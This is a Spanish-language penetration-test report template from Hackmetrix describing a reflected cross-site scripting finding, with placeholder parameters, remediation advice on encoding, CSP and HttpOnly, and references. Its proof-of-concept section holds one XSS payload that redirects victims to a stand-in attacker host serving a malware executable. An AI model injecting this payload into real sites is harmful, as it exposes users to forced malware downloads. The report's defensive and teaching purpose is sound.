### Descripción

Las Reflected Cross-Site Scripting se producen cuando el servidor devuelve los datos proporcionados a una aplicación web por un usuario como parte de la respuesta sin estar debidamente codificados.

Los ataques de Reflected Cross-Site Scripting ocurren cuando los datos ingresan a la aplicación web a través de una fuente no confiable, la mayoría de las veces una solicitud web, y luego la entrada se incluye y se refleja en el contenido dinámico que se genera sin validarse para contenido malicioso. Un atacante puede usar XSS para enviar un script malicioso a un usuario desprevenido. El navegador del usuario final no tiene forma de saber que el script no debe ser confiable y ejecutará el script. Debido a que cree que el script provino de una fuente confiable, el script malicioso puede acceder a cualquier cookie, tokens de sesión u otra información confidencial retenida por el navegador y utilizada con ese sitio. Estos scripts pueden incluso reescribir el contenido de la página HTML.

Un adversario podría aprovechar esta vulnerabilidad para crear un enlace al dominio de la aplicación que contiene un payload útil de ataque. Este enlace podría publicarse en un foro público o enviarse como parte de un correo electrónico de suplantación de identidad (phishing) a un objetivo confiado. El alcance de los ataques que pueden lanzarse de esta manera es extremadamente amplio, desde el secuestro de la sesión hasta atacar la red interna y comprometer la estación de trabajo de la víctima (consulte el proyecto BeEF en la sección de referencias).

### Componentes Afectados

- https://www.cliente_url.com/modulo1/afectado1?id=1&time=now
    - Parámetro Afectado:  id
- https://www.cliente_url.com/modulo2/afectado2?cat=1&dir=/
    - Parámetro Afectado:  dir

### Details

Hackmetrix encontró una vulnerabilidad de Reflected Cross Site Scripting en el parámetro §VULNERABLE PARAMETER§ que permite la inyección de código JavaScript del lado del cliente. Cuando se realiza una búsqueda en la aplicación. El código JavaScript se inyecta de forma reflejada y al completar la búsqueda el código es ejecutado en el navegador.

Este tipo de vulnerabilidades se utilizan comúnmente para obtener las cookies de sesión del usuario, pero los métodos de explotación varían en la imaginación del atacante. Es posible ejecutar vectores que fuercen la descarga de Malware en la máquina de la victima o inyectar Scripts de minería de bitcoin’s en la sesión del navegador.

Hackmetrix realizara la siguiente PoC para mostrar como es posible inyectar código JavaScript malicioso en el navegador de la victima, forzando a un usuario a descargar Malware en su equipo.

**Paso 1:** Por medio del siguiente Request fue posible inyectar código JavaScript dentro del parámetro *§VULNERABLE PARAMETER§*.

*HTTP Request*:

```
§REQUEST EXAMPLE§
```

*HTTP Response*:

```
§RESPONSE EXAMPLE§
```

El siguiente Payload fue inyectado en la pagina de búsqueda:

```
§<script>document.location.href="http://attacker.example.com/m.exe";</script>§El cual realiza una redirección a la URL "§http://attacker.example.com/m.exe§" donde se encuentra el Malware alojado en el servidor del atacante.**Paso 2:** Posteriormente el código JavaScript fue ejecutado en el navegador de la victima, mostrando una ventana de descarga.!§imagen download malware xss reflected§!
```

### Impacto

{{ Agregar conclusión de impacto dependiendo de la lógica del negocio del cliente }}

### Remediación

La prevención confiable de las vulnerabilidades de los Cross-Site Scripting requiere la codificación de todos los caracteres especiales HTML en datos potencialmente maliciosos. Esto generalmente se hace directamente antes de que se muestren mediante aplicaciones web (o scripts del lado del cliente), y muchos lenguajes de programación tienen funciones o bibliotecas integradas que proporcionan esta codificación (en este contexto, también se denomina comillas).

o escapando).

Tenga en cuenta que la codificación adecuada debe aplicarse dependiendo de dónde se encuentren los datos proporcionados por el usuario. Por ejemplo, los datos que aparecen dentro de un bloque HTML deben estar codificados en HTML, mientras que los datos que aparecen dentro de un bloque JavaScript deben estar codificados en JavaScript.

Adicional a la validación, escapeo y sanitización de las entradas del usuario, se pueden agregar varias otras opciones para mayor seguridad. El encabezado de respuesta HTTP X-XSS-Protection es una característica de Internet Explorer, Chrome y Safari que impide que las páginas se carguen cuando detectan ataques de Reflected Cross-Site Scripting (XSS). Aunque estas protecciones son en gran medida innecesarias en los navegadores modernos cuando los sitios implementan una fuerte Política de Seguridad de Contenido que desactiva el uso de JavaScript en línea (inseguro en línea), todavía pueden proporcionar protecciones para los usuarios de navegadores web más antiguos que aún no admiten CSP. La Política de seguridad de contenido (CSP) es una capa adicional de seguridad que ayuda a detectar y mitigar ciertos tipos de ataques, incluidos los Cross-Site Scripting (XSS) y los ataques de inyección de datos. Para habilitar CSP, debe configurar su servidor web para que devuelva el encabezado HTTP de la Política de seguridad de contenido.

Por último, pero no menos importante, HttpOnly es un indicador adicional que se puede incluir en un encabezado de respuesta HTTP Set-Cookie. El uso del indicador HttpOnly al generar una cookie ayuda a mitigar el riesgo de que el script del lado del cliente acceda a la cookie protegida.

### Referencias

- Hackmetrix Blog: https://blog.hackmetrix.com/xss-cross-site-scripting/
- X-XSS-Protection MDN Web Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
- XSS Prevention Cheat Sheet: https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet_Prevention_Cheat_Sheet)
- CWE-79: Cross-site Scripting: https://cwe.mitre.org/data/definitions/79.html
- OWASP cross-site scripting (XSS): https://www.owasp.org/index.php/XSS

